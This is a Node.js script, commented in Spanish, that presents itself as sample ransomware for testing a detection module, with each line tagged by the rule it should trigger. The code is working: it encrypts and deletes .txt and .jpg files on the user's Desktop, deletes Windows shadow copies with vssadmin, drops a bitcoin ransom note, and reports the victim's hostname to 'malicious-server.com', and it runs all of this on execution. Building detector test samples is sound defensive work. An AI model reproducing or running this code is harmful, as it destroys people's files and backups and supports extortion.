// Este es un script de ransomware de ejemplo para la validación del módulo ANTLRDetection.
// Intenta emular un comportamiento malicioso combinando múltiples indicadores.

// --- 1. Imports para el comportamiento de Cifrado y Manipulación de Archivos ---
// triggers: file_access_import, crypto_import
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const child_process = require('child_process');

// --- 2. Palabras clave y Strings específicos de ransomware ---
// triggers: crypto_keyword, payment_keyword, ransomware_keywords, locked_extension_keyword
const ENCRYPTION_KEY = 'clave_secreta_del_ransomware'; // Hardcoded secret
const RANSOM_NOTE_FILENAME = 'README_TO_DECRYPT.txt';
const ENCRYPTED_EXTENSION = '.locked';
const PAYMENT_ADDRESS = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2';
const RANSOM_MESSAGE = `
TUS ARCHIVOS HAN SIDO CIFRADOS!

Hemos encriptado todos tus archivos importantes. Para restaurar
la recuperacion (recovery) de tus datos, debes realizar un pago (payment)
en bitcoin (bitcoin) a la siguiente direccion: ${PAYMENT_ADDRESS}.

No intentes descifrar (decrypt) los archivos por tu cuenta.
`;

// --- 3. Funciones para la Lógica de Cifrado y Traversal del Sistema de Archivos ---
// triggers: file_traversal, file_read, file_write, crypto_op
function encryptFile(filePath) {
    try {
        const fileContent = fs.readFileSync(filePath);
        const algorithm = 'aes-256-cbc';
        const cipher = crypto.createCipheriv(algorithm, ENCRYPTION_KEY.padEnd(32), 'a'.repeat(16));
        
        let encrypted = cipher.update(fileContent);
        encrypted = Buffer.concat([encrypted, cipher.final()]);

        fs.writeFileSync(filePath + ENCRYPTED_EXTENSION, encrypted);
        fs.unlinkSync(filePath); // trigger: file_delete
        
        console.log(`Fichero encriptado: ${filePath}`);
    } catch (e) {
        // trigger: EMPTY_CATCH_BLOCK
        console.log(`Error al cifrar el archivo: ${e}`);
    }
}

// Recorrer directorios del usuario
// triggers: file_traversal
function traverseAndEncrypt(dir) {
    fs.readdirSync(dir).forEach(file => { // trigger: file_traversal
        const filePath = path.join(dir, file);
        if (fs.statSync(filePath).isFile()) {
            if (filePath.endsWith('.txt') || filePath.endsWith('.jpg')) {
                encryptFile(filePath);
            }
        }
    });
}

// --- 4. Lógica de Destrucción de Backups y Persistencia ---
// triggers: backup_api_call, self_location_path, os_command_exec
function destroyBackups() {
    // Intenta eliminar las copias de seguridad de Windows
    child_process.execSync('vssadmin.exe Delete Shadows /All /Quiet'); // trigger: os_command_exec, backup_api_call
}

function establishPersistence() {
    const currentFilePath = process.execPath; // trigger: self_location_path
    console.log(`Estableciendo persistencia con la ruta: ${currentFilePath}`);
    // Código real aquí para añadirlo al registro o a un archivo de inicio
}

// --- 5. Lógica de Despliegue de Nota de Rescate y Comunicación C2 ---
// triggers: file_create, ransom_note_filename, bitcoin_ref, network_connection
function deployRansomNote() {
    const desktopPath = path.join(os.homedir(), 'Desktop');
    const notePath = path.join(desktopPath, RANSOM_NOTE_FILENAME);
    fs.writeFileSync(notePath, RANSOM_MESSAGE); // trigger: file_write
}

function reportToC2Server() {
    const client = new require('net').Socket(); // trigger: net (network_import)
    client.connect(1337, 'malicious-server.com', () => { // trigger: network_connection
        console.log('Conexión al servidor C&C establecida.');
        client.write(JSON.stringify({ victim: os.hostname(), files: 100 }));
        client.destroy();
    });
}


// --- Lógica de Ejecución Principal ---
function main() {
    console.log("Iniciando operación de ransomware de ejemplo...");
    
    // Ejecutar lógica de cifrado
    traverseAndEncrypt(path.join(os.homedir(), 'Desktop'));
    
    // Destruir backups
    destroyBackups();
    
    // Desplegar nota de rescate
    deployRansomNote();
    
    // Reportar al servidor C2
    reportToC2Server();

    // Establecer persistencia
    establishPersistence();

    console.log("Operación completada.");
}

main();